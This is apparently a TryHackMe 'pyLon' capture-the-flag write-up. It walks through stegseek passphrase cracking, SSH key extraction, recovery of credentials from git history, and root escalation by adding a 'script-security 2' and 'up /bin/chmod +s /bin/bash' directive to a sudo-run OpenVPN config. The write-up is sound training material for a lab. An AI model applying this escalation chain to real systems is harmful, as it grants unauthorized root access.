# pyLon

## Introduction

Welcome to my another writeup! In this TryHackMe [pyLon](https://tryhackme.com/room/pylonzf) room, you'll learn: Steganography, abusing OpenVPN config file and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: lone to pood](#privilege-escalation)**
4. **[Privilege Escalation: pood to root](#pood-to-root)**
5. **[Conclusion](#conclusion)**

## Background

> Can you penetrate the defenses and become root?
>  
> Difficulty: Medium

---

After rummaging through a colleages drawer during a security audit, you find a USB key with an interesting file, you think its hiding something, use the data on the key to penetrate his workstation, and become root.

This room contains steganography and may be difficult. If you are finding it difficult to overcome, read the hint for flag 1.

Being able to analyse a file and determine its contents is important. Once you extract the hidden file in the image, there will be further work to do.

Remember, password reuse is bad practice.

## Task 1 - Recon

**In this task, we can download a file:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/pyLon/images/Pasted%20image%2020230110012620.png)

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# file pepper.jpg   
pepper.jpg: JPEG image data, baseline, precision 8, 2551x1913, components 3
```

It's an image file.

Let's open it:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# eog pepper.jpg
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/pyLon/images/Pasted%20image%2020230110012709.png)

A dog.

**Let's try to use `steghide` to extract hidden stuff inside it:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# steghide extract -sf pepper.jpg        
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

**Hmm... Let's use `stegseek` to crack the passphrase:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# stegseek --crack pepper.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "{Redacted}"
[i] Original filename: "lone".
[i] Extracting to "pepper.jpg.out".
```

Nice!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# mv pepper.jpg.out lone

┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# cat lone 
H4sIAAAAAAAAA+3Vya6zyBUA4H/NU9w9ilxMBha9KObZDMY2bCIGG2MmMw9P39c3idRZtJJNK4rE
J6FT0imkoupQp2zq+9/z9NdfCXyjafoTMZoCf4wfBEnQvzASAJKkAX7EfgEMo2jw6wv8pav6p7Ef
ou7r69e7aVKQ/fm8/5T/P/W3D06UVevrZIuW5ylftqte4Fn80sXgJ4vEBFfGtbVFPNaFt2JIXyL8
4GRqiiv/MxTjih1DB/4L93mk+TNMtwTPhqRGrOdPav5++TPRESFJ1ZenOJwJutdri7sq+CXob/EL
[...]
```

No idea what it is.

**I also wanna use `exiftool` to view the metadata of the image file:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# exiftool pepper.jpg
ExifTool Version Number         : 12.52
File Name                       : pepper.jpg
Directory                       : .
File Size                       : 390 kB
File Modification Date/Time     : 2023:01:10 01:25:33-05:00
File Access Date/Time           : 2023:01:10 01:26:28-05:00
File Inode Change Date/Time     : 2023:01:10 01:26:24-05:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
XMP Toolkit                     : Image::ExifTool 12.16
Subject                         : https://gchq.github.io/CyberChef/#recipe=To_Hex('None',0)To_Base85('!-u',false)
Image Width                     : 2551
Image Height                    : 1913
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 2551x1913
Megapixels                      : 4.9
```

The `Subject` is interesting: `https://gchq.github.io/CyberChef/#recipe=To_Hex('None',0)To_Base85('!-u',false)`

**It's referring to [CyberChef](https://gchq.github.io/CyberChef/), and the recipe is To Hex -> To Base85:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/pyLon/images/Pasted%20image%2020230110013244.png)

**Let's decode the `pepper.jpg.out` with that recipe:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/pyLon/images/Pasted%20image%2020230110013424.png)

Hmm...

**We can also try to base64 decode that:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# base64 -d lone > lone_decoded
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# file lone_decoded 
lone_decoded: gzip compressed data, from Unix, original size modulo 2^32 10240
```

Oh! It's a `gzip` file!

**Let's decompress it:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# mv lone_decoded lone_decoded.gz   
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# gunzip lone_decoded.gz

┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# file lone_decoded 
lone_decoded: POSIX tar archive (GNU)
```

**Now it's a `tar` archive file. We can use `tar` to extract it:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# tar -xf lone_decoded
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# cat lone_id 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
{Redacted}
43kcLdLe8Jv/ETfTAAAAC3B5bG9uQHB5bG9uAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

Found a SSH private key!

**We need to change the file permission to only allow our current user:** (This is how private SSH key works.)
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# chmod 600 lone_id
```

## Task 2 - pyLon

You extracted some files, and now you will attempt to penetrate the system.

---

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# export RHOSTS=10.10.71.253 
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT    STATE SERVICE REASON         VERSION
22/tcp  open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 129fae2df8af04bc8d6e2d5566a8b755 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC48TQ2bNsfSzCnjiLLFrhPxsQFtcf4tlGCuD9FFnqSRngeiwGx5OYXmVpTmZ3oQBlg09xQZHhOx0HG1w9wQTeGNfrJ3HbI7Ne4gzCXeNacwNrPwa9kQ4Jhe90rXUGbsnjwrSTXSe/j2vEIDOPo+nlP7HJZBMvzPR8YohRxpn/zmA+1/yldVDueib64A3bwaKZ/bjFs8PvY4kRCwaFF3j0vhHT5bteQWqllpJXOYMe/kXiHa8pZoSamp+fNQm7lxIpXZhcw13cXWauVftAMloIfuOJQnOxmexbCbC0D0LTj/W1KdYIXcw9+4HdNn+R0wFFgOWfL49ImnGeZvIz+/KV7
|   256 ce65ebce9f3f57166a79459dd3d2ebf2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAngdr5IauC530BNjl20lrHWKkcbrDv4sx0cCN3LDhz01JHzSrlxO4+4JizUGzK/nY/RUY1w5iyv9w9cp4cayVc=
|   256 6c3ba7023fa9cd83f2b9466cd0d6e6ec (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIxQ6Fpj73z02s4gj/3thP3O1xXMmVp60yt1Ff7wObmh
222/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 39e1e40eb5408ab9e0ded06e7882e828 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCWmYY++QRFaOM4hlW77VN6PvZcLVj1gqoBUnqRt3WbbrYUzwe9nBU4YdM6LN1d57KrNuzZyrvjS2+9V9Wz7AtsiBGz+7rOMejT4A3hz6GdMUZwAZ7jhDEqqYV/BDP+xcadiLuHWnYFyeSy1xLhVRtZsnU8bXCg9+meHv6PBMq6+TFK5zkmYXBshEyj8LpH9MRGXlwHREkbAcllAr0gNRTrJpwI4/r/O//V6TIA1wyLoDZtYQABVsVoGd9R0vu++HLrNI9+NBi7BVyUvOSkQmsoFNAkMslZv9S7TOG/VQQOrJMjRY/EGPu6JwLHmpd+Kf3q6cOrCjfQOXRo+UaD/E0cfNClCXlJPAa3t8SzqYBK7ebkCwF7fifuOH7vIGgioN9jJNYzcB1hlLcfuBhv69qpe99DL7C4Qqk0ftv9TQgx945JhQiq2LH90eYDUGXmVu0wKLu4mfMfLSUYYgXEZGNkqIW/IM13wagN1FHZBNMsyR1/f/O9igD/qEt0KT70Zfs=
|   256 c6f64821fd076677fcca3d83f5ca1ba3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC9mDTxaeB3QKOzrGC5WK4WId+ZzFhUAgFK5ONKQ7I2Ya+FmBk/R4Uqjq3Epc0Xv31gi6r3k8ytRBYFMmq3L66g=
|   256 17a25bae4e4420fb28586b56343a14b3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICwLlQimfX4lrWWdFenHEWZgUWVWRQj1Mt0L4IBeeTnJ
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 2 ports are opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 7.6p1 Ubuntu
222               | OpenSSH 8.4

### SSH on Port 22

**Since we have user `lone`'s private SSH key, we can try to SSH into user `lone`:** 
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# ssh -i lone_id lone@$RHOSTS       
The authenticity of host '10.10.71.253 (10.10.71.253)' can't be established.
ED25519 key fingerprint is SHA256:a4J2LwSwZl59RFhvrfKuRiFGA2RDy+i9GN/nNgd2b44.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.71.253' (ED25519) to the list of known hosts.
lone@10.10.71.253's password: 
Permission denied, please try again.
```

Not this port.

### SSH on Port 222

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# ssh -i lone_id lone@$RHOSTS -p 222
[...]
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

[*] Encryption key exists in database.

Enter your encryption key: 
```

Encryption key? Maybe that's the passphrase that we've cracked in `stegseek`?

```
[!] Invalid encryption key.
Try again?
(Y)es or (N)o: 
```

Nope.

## Initial Foothold

Cool. Let's take a step back.

We've found the `pepper.jpg` passphrase, and a CyberChef link.

Maybe we need to encode that passphrase?

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/pyLon/images/Pasted%20image%2020230110015817.png)

```
Enter your encryption key: 
[*] Encryption key correct.
[*] Initialization complete.
```

```
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

  
        [1] Decrypt a password.
        [2] Create new password.
        [3] Delete a password.
        [4] Search passwords.
        

Select an option [Q] to Quit: 
```

Nice!

In here, we can:

1. Decrypt a password
2. Create new password
3. Delete a password
4. Search passwords

**Let's try to decrypt a password:**
```
Select an option [Q] to Quit: 1

         SITE                        USERNAME
 [1]     pylon.thm                   lone                        
 [2]     FLAG 1                      FLAG 1                      

Select a password [C] to cancel: 
```

**Now, we can decrypt 2 passwords. Let's decrypt them:**
```
Select a password [C] to cancel: 1

    Password for pylon.thm

        Username = lone
        Password = {Redacted}            

Press ENTER to continue.

Select a password [C] to cancel: 2

    Password for FLAG 1

        Username = FLAG 1
        Password = THM{Redacted}            

Press ENTER to continue.
```

Nice! We found flag 1 and `lone`'s password!

**We now can try to SSH into port 22:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# ssh lone@$RHOSTS        
lone@10.10.71.253's password: 
Welcome to
                   /
       __         /       __    __
     /   ) /   / /      /   ) /   )
    /___/ (___/ /____/ (___/ /   /
   /         /
  /      (_ /       by LeonM

Last login: Tue Jan 10 07:03:50 2023 from 10.9.0.253
lone@pylon:~$ whoami;hostname;id;ip a
lone
pylon
uid=1002(lone) gid=1002(lone) groups=1002(lone)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:0a:a3:c6:24:7f brd ff:ff:ff:ff:ff:ff
    inet 10.10.71.253/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3152sec preferred_lft 3152sec
    inet6 fe80::a:a3ff:fec6:247f/64 scope link 
       valid_lft forever preferred_lft forever
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 100
    link/none 
    inet 172.31.12.1 peer 172.31.12.2/32 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 fe80::bd2:40fa:2a1d:59fd/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever
4: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:5e:36:3a:e4 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:5eff:fe36:3ae4/64 scope link 
       valid_lft forever preferred_lft forever
6: veth09d453b@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether e6:83:64:8f:88:c0 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::e483:64ff:fe8f:88c0/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `lone`!

**user1.txt:**
```
lone@pylon:~$ cat /home/lone/user1.txt
TMM{Redacted}
```

## Privilege Escalation

### lone to pood

Let's do some basic enumerations!

**System users:**
```
lone@pylon:~$ cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
pylon:x:1000:1000:pylon:/home/pylon:/bin/bash
pood:x:1001:1001:poo D,,,:/home/pood:/bin/bash
lone:x:1002:1002:lon E,,,:/home/lone:/bin/bash

lone@pylon:~$ ls -lah /home
total 20K
drwxr-xr-x  5 root  root  4.0K Jan 30  2021 .
drwxr-xr-x 24 root  root  4.0K Mar 30  2021 ..
drwxr-x---  6 lone  lone  4.0K Jan 30  2021 lone
drwxr-x---  5 pood  pood  4.0K Jan 30  2021 pood
drwxr-x---  5 pylon pylon 4.0K Mar 30  2021 pylon
```

- Found system user: `lone`, `pood`, `pylon`

**Sudo permission:**
```
lone@pylon:~$ sudo -l
[sudo] password for lone: 
Matching Defaults entries for lone on pylon:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lone may run the following commands on pylon:
    (root) /usr/sbin/openvpn /opt/openvpn/client.ovpn
```

**User `lone` can run `/usr/sbin/openvpn /opt/openvpn/client.ovpn` as root.**

**Kernel version:**
```
lone@pylon:~$ uname -a;cat /etc/issue
Linux pylon 4.15.0-140-generic #144-Ubuntu SMP Fri Mar 19 14:12:35 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
Ubuntu 18.04.5 LTS \n \l
```

**User `lone` home directory:**
```
lone@pylon:~$ ls -lah
total 48K
drwxr-x--- 6 lone lone 4.0K Jan 30  2021 .
drwxr-xr-x 5 root root 4.0K Jan 30  2021 ..
lrwxrwxrwx 1 lone lone    9 Jan 30  2021 .bash_history -> /dev/null
-rw-r--r-- 1 lone lone  220 Jan 30  2021 .bash_logout
-rw-r--r-- 1 lone lone 3.7K Jan 30  2021 .bashrc
drwx------ 2 lone lone 4.0K Jan 30  2021 .cache
-rw-rw-r-- 1 lone lone   44 Jan 30  2021 .gitconfig
drwx------ 4 lone lone 4.0K Jan 30  2021 .gnupg
drwxrwxr-x 3 lone lone 4.0K Jan 30  2021 .local
-rw-r--r-- 1 lone lone  807 Jan 30  2021 .profile
-rw-rw-r-- 1 pood pood  600 Jan 30  2021 note_from_pood.gpg
drwxr-xr-x 3 lone lone 4.0K Jan 30  2021 pylon
-rw-r--r-- 1 lone lone   18 Jan 30  2021 user1.txt
```

**`.gitconfig`:**
```
lone@pylon:~$ cat .gitconfig 
[user]
	email = lone@pylon.thm
	name = lone
```

**`note_from_pood.gpg`:**
```
lone@pylon:~$ file note_from_pood.gpg 
note_from_pood.gpg: PGP RSA encrypted session key - keyid: A7A53FD8 57FE0F16 RSA (Encrypt or Sign) 3072b .
```

An encrypted GPG file.

**`pylon/`:**
```
lone@pylon:~$ ls -lah pylon/
total 40K
drwxr-xr-x 3 lone lone 4.0K Jan 30  2021 .
drwxr-x--- 6 lone lone 4.0K Jan 30  2021 ..
drwxrwxr-x 8 lone lone 4.0K Jan 30  2021 .git
-rw-rw-r-- 1 lone lone  793 Jan 30  2021 README.txt
-rw-rw-r-- 1 lone lone  340 Jan 30  2021 banner.b64
-rwxrwxr-x 1 lone lone 8.3K Jan 30  2021 pyLon.py
-rw-rw-r-- 1 lone lone 2.2K Jan 30  2021 pyLon_crypt.py
-rw-rw-r-- 1 lone lone 3.9K Jan 30  2021 pyLon_db.py
```

**Let's view it's `git` commit logs!**
```
lone@pylon:~$ cd pylon/
lone@pylon:~/pylon$ git log
commit 73ba9ed2eec34a1626940f57c9a3145f5bdfd452 (HEAD, master)
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:55:46 2021 +0000

    actual release! whoops

commit 64d8bbfd991127aa8884c15184356a1d7b0b4d1a
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:54:00 2021 +0000

    Release version!

commit cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:47:00 2021 +0000

    Initial commit!
```

**Let's `checkout` the first commit:**
```
lone@pylon:~/pylon$ git checkout cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
Previous HEAD position was 73ba9ed actual release! whoops
HEAD is now at cfc14d5 Initial commit!
lone@pylon:~/pylon$ ls -lah
total 52K
drwxr-xr-x 3 lone lone 4.0K Jan 10 07:24 .
drwxr-x--- 6 lone lone 4.0K Jan 30  2021 ..
drwxrwxr-x 8 lone lone 4.0K Jan 10 07:24 .git
-rw-rw-r-- 1 lone lone  793 Jan 30  2021 README.txt
-rw-rw-r-- 1 lone lone  340 Jan 30  2021 banner.b64
-rw-rw-r-- 1 lone lone  12K Jan 10 07:24 pyLon.db
-rw-rw-r-- 1 lone lone 2.5K Jan 10 07:24 pyLon_crypt.py
-rw-rw-r-- 1 lone lone 3.9K Jan 30  2021 pyLon_db.py
-rw-rw-r-- 1 lone lone  11K Jan 10 07:24 pyLon_pwMan.py
```

```
lone@pylon:~/pylon$ file pyLon.db
pyLon.db: SQLite 3.x database, last written using SQLite version 3022000
```

We now found a SQLite database file!

**Let's transfer that file to our attacker machine:**
```
lone@pylon:~/pylon$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# wget http://$RHOSTS:8000/pyLon.db

┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# sqlite3 pyLon.db 
[...]
sqlite> .tables
pwCheck  pwMan  
sqlite> SELECT * FROM pwMan;
pylon.thm_gpg_key|lone_gpg_key|{Redacted}
sqlite> SELECT * FROM pwCheck;
{Redacted}
```

**The `pwCheck` table has a hashed value:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# hash-identifier '{Redacted}'
[...]
Possible Hashs:
[+] SHA-512
[+] Whirlpool

Least Possible Hashs:
[+] SHA-512(HMAC)
[+] Whirlpool(HMAC)
```

**It's a SHA-512 hash! Let's crack it via `john`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# echo '{Redacted}' > hash.txt
                                                                                                       
┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA512 hash.txt    
[...]
Session completed.
```

Nope.

Let's take a step back.

**We can also try to run `pyLon_pwMan.py`:**
```
lone@pylon:~/pylon$ python3 pyLon_pwMan.py
               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

[*] Encryption key exists in database.

Enter your encryption key: 
```

**Again, the encryption key should be the same:**
```
Enter your encryption key: 
[*] Encryption key correct.
[*] Initialization complete.

        [1] List passwords.
        [2] Decrypt a password.
        [3] Create new password.
        [4] Delete a password.
        [5] Search passwords.
        [6] Display help menu
        

Select an option [Q] to Quit:
```

**This time however, we can see an extra option:**
```
Select an option [Q] to Quit: 6

    [1] This item lists all the passwords in the Database.
    [2] This item lets you choose a password to display.
    [3] This item lets you create a new password.
    [4] This item lets you delete unwanted passwords.
    [5] This item lets you search the username and site fields.
    [6] This item displays this detailed help menu.
    
    
Press ENTER to continue.
```

**Nice. Let's choose a password to display:**
```
Select an option [Q] to Quit: 2

         SITE                        USERNAME
 [1]     pylon.thm_gpg_key           lone_gpg_key                

Select a password [C] to cancel: 1

    Password for pylon.thm_gpg_key

        Username = lone_gpg_key
        Password = {Redacted}            

[*] Install xclip to copy to clipboard.
[*] sudo apt install xclip

[*] Password copied to the clipboard.

Press ENTER to continue.
```

Found the GPG key passphrase!

**Armed with above information, we can try to decrypt the encrypted GPG file:**
```
lone@pylon:~/pylon$ cd ..
lone@pylon:~$ ls -lah
[...]
-rw-rw-r-- 1 pood pood  600 Jan 30  2021 note_from_pood.gpg
[...]
```

```
lone@pylon:~$ gpg -d note_from_pood.gpg

┌────────────────────────────────────────────────────────────────┐
│ Please enter the passphrase to unlock the OpenPGP secret key:  │
│ "lon E <lone@pylon.thm>"                                       │
│ 3072-bit RSA key, ID D83FA5A7160FFE57,                         │
│ created 2021-01-27 (main key ID EA097FFFA0996DAA).             │
│                                                                │
│                                                                │
│ Passphrase: ****************__________________________________ │
│                                                                │
│         <OK>                                    <Cancel>       │
└────────────────────────────────────────────────────────────────┘
```

```
lone@pylon:~$ gpg -d note_from_pood.gpg 
gpg: encrypted with 3072-bit RSA key, ID D83FA5A7160FFE57, created 2021-01-27
      "lon E <lone@pylon.thm>"
Hi Lone,

Can you please fix the openvpn config?

It's not behaving itself again.

oh, by the way, my password is {Redacted}

Thanks again.
```

Found new password!

Also, user `lone` can run `/usr/sbin/openvpn /opt/openvpn/client.ovpn` as root via `sudo`. Maybe we can do something weird to the openvpn config file?

**Anyway, let's Switch User to `pood`:**
```
lone@pylon:~$ su pood
Password: 
pood@pylon:/home/lone$ whoami;hostname;id;ip a
pood
pylon
uid=1001(pood) gid=1001(pood) groups=1001(pood)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:0a:a3:c6:24:7f brd ff:ff:ff:ff:ff:ff
    inet 10.10.71.253/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2928sec preferred_lft 2928sec
    inet6 fe80::a:a3ff:fec6:247f/64 scope link 
       valid_lft forever preferred_lft forever
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 100
    link/none 
    inet 172.31.12.1 peer 172.31.12.2/32 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 fe80::bd2:40fa:2a1d:59fd/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever
4: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:5e:36:3a:e4 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:5eff:fe36:3ae4/64 scope link 
       valid_lft forever preferred_lft forever
6: veth09d453b@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether e6:83:64:8f:88:c0 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::e483:64ff:fe8f:88c0/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `pood`!

**user2.txt:**
```
pood@pylon:/home/lone$ cat /home/pood/user2.txt 
THM{Redacted}
```

### pood to root

**Sudo permission:**
```
pood@pylon:/home/lone$ sudo -l
[sudo] password for pood: 
Matching Defaults entries for pood on pylon:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pood may run the following commands on pylon:
    (root) sudoedit /opt/openvpn/client.ovpn
```

As you can see, user `pood` can run `sudoedit /opt/openvpn/client.ovpn` as root!

**By combining user `lone` and `pood`'s sudo permission, we can escalate to root!**

**But first, let's view the config file:**
```
pood@pylon:/home/lone$ sudoedit /opt/openvpn/client.ovpn

client
dev tun
proto udp
remote 127.0.0.1 1194
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
cipher AES-256-CBC

<ca>
-----BEGIN CERTIFICATE-----
[...]
```

As you can see, the config file is connecting to localhost on port 1194.

**Now, according to a [Medium post](https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da) that I've found, we can escalate to root by modifying the config file:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/pyLon/images/Pasted%20image%2020230110024742.png)

**Let's modify the config file!**
```
pood@pylon:/home/lone$ sudoedit /opt/openvpn/client.ovpn
```

```
client
dev tun
script-security 2
up "/bin/chmod +s /bin/bash"
proto udp
[...]
```

In here, the `script-security 2` is to enable user-defined scripts. Then, the `up` command will execute any binary of script you point it to. In this case, we're using `/bin/chmod` to add a SUID sticky bit to `/bin/bash`, so we can spawn a root Bash shell.

**Let's save it, and run `openvpn` in user `lone`:**
```
lone@pylon:~$ sudo /usr/sbin/openvpn /opt/openvpn/client.ovpn
Tue Jan 10 07:46:34 2023 OpenVPN 2.4.4 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on May 14 2019
Tue Jan 10 07:46:34 2023 library versions: OpenSSL 1.1.1  11 Sep 2018, LZO 2.08
Tue Jan 10 07:46:34 2023 NOTE: the current --script-security setting may allow this configuration to call user-defined scripts
Tue Jan 10 07:46:34 2023 TCP/UDP: Preserving recently used remote address: [AF_INET]127.0.0.1:1194
Tue Jan 10 07:46:34 2023 UDP link local: (not bound)
Tue Jan 10 07:46:34 2023 UDP link remote: [AF_INET]127.0.0.1:1194
Tue Jan 10 07:46:34 2023 [server] Peer Connection Initiated with [AF_INET]127.0.0.1:1194
Tue Jan 10 07:46:35 2023 TUN/TAP device tun1 opened
Tue Jan 10 07:46:35 2023 do_ifconfig, tt->did_ifconfig_ipv6_setup=0
Tue Jan 10 07:46:35 2023 /sbin/ip link set dev tun1 up mtu 1500
Tue Jan 10 07:46:35 2023 /sbin/ip addr add dev tun1 local 172.31.12.6 peer 172.31.12.5
Tue Jan 10 07:46:35 2023 /bin/chmod +s /bin/bash tun1 1500 1552 172.31.12.6 172.31.12.5 init
/bin/chmod: cannot access 'tun1': No such file or directory
/bin/chmod: cannot access '1500': No such file or directory
/bin/chmod: cannot access '1552': No such file or directory
/bin/chmod: cannot access '172.31.12.6': No such file or directory
/bin/chmod: cannot access '172.31.12.5': No such file or directory
/bin/chmod: cannot access 'init': No such file or directory
Tue Jan 10 07:46:35 2023 WARNING: Failed running command (--up/--down): external program exited with error status: 1
Tue Jan 10 07:46:35 2023 Exiting due to fatal error
```

**Check the payload worked or not:**
```
lone@pylon:~$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1.1M Jun  6  2019 /bin/bash
```

**It worked! Let's spawn a root Bash shell:**
```
lone@pylon:~$ /bin/bash -p
bash-4.4# whoami;hostname;id;ip a
root
pylon
uid=1002(lone) gid=1002(lone) euid=0(root) egid=0(root) groups=0(root),1002(lone)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
